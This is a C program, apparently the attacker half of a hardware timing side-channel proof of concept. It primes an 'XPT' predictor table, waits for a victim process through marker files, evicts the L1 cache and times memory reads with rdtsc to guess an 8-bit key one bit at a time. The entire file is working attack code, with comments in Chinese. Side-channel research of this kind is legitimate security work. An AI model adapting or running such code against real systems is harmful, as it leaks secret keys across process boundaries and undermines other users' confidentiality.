#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>

#define XPT_SIZE 256
#define KEY_BITS 8
#define L1_EVICT_SIZE (512 * 1024)

uint8_t attacker_mem[1024 * 4096] __attribute__((aligned(4096)));
uint8_t l1_evict_set[L1_EVICT_SIZE] __attribute__((aligned(4096)));

static inline uint64_t rdtsc() {
    uint32_t lo, hi;
    __asm__ volatile ("rdtsc" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}

int main() {
    volatile uint8_t junk;
    uint8_t guessed_key = 0;
    
    printf("[Attacker] === 4-Step XPT Attack (Self-Correcting) ===\n");

    // --- Step 0: Warm-up (非常重要) ---
    // 跑一轮假训练，确保 XPT 状态机已经就绪
    // 在 attacker.c 的 Warm-up 部分
    printf("[Attacker] Warm-up: Initializing TLB and XPT...\n");
    for (int i = 0; i < 100; i++) {
        junk = attacker_mem[0]; // 反复读，确保 Page 0 在 TLB 和 XPT 里都“热”了
    }
    __asm__ volatile("mfence");
    printf("[Attacker] Warm-up complete. System ready.\n");

    for (int bit = 0; bit < KEY_BITS; bit++) {
        unlink("prime_done");
        while (access("victim_done", F_OK) == 0) unlink("victim_done");

        // Step 1: 精准训练
        // 增加循环次数到 80，确保条目被标记为 Enabled 且占据最老位置
        for (int p = 0; p < XPT_SIZE; p++) {
            for (int i = 0; i < 80; i++) junk = attacker_mem[p * 4096];
        }

        close(open("prime_done", O_CREAT | O_RDWR, 0666));
        while (access("victim_done", F_OK) == -1);

        // Step 3: 探测
        for (int i = 0; i < L1_EVICT_SIZE; i += 64) junk = l1_evict_set[i];
        __asm__ volatile("mfence");

        uint64_t start = rdtsc();
        junk = attacker_mem[0];
        __asm__ volatile("lfence");
        uint64_t end = rdtsc();
        uint32_t latency = (uint32_t)(end - start);

        // 判定逻辑：只有当延迟超过 300 时才判定为 1
        if (latency > 300) {
            guessed_key |= (1 << bit);
            printf("[Attacker] Bit %d: Latency %u -> GUESS 1\n", bit, latency);
        } else {
            printf("[Attacker] Bit %d: Latency %u -> GUESS 0\n", bit, latency);
        }
        fflush(stdout);

        // Step 4: 清理
        // 访问一段完全不同的内存 (Page 512+)
        for (int p = 512; p < 512 + 256; p++) {
            for (int i = 0; i < 50; i++) junk = attacker_mem[p * 4096];
        }
    }

    printf("[Attacker] === Final Guess: 0x%02x ===\n", guessed_key);
    unlink("prime_done");
    return 0;
}